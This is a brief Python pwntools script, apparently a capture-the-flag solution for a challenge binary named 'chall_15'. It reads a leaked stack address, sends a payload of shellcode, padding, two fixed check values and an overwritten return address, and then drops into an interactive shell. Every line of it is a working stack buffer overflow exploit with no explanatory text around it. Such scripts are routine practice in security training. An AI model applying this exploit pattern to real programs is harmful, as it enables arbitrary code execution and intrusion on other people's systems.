from pwn import *
p = process("./chall_15")
context.arch = "amd64"
shcr = asm(shellcraft.sh())
schr_len = len(shcr)
p.recvuntil("Sometimes the canary is in the coal mine, sometimes the canary is on the stack, and sometimes ... baked beans")
rec = p.recv()
bof = int(rec,16)
payload = shcr + b'B'* 232 + p32(0xdeadd00d) + p32(0xb16b00b5) + b'C' * 8 + p64(bof)
p.sendline(payload)
p.interactive()
p.close()
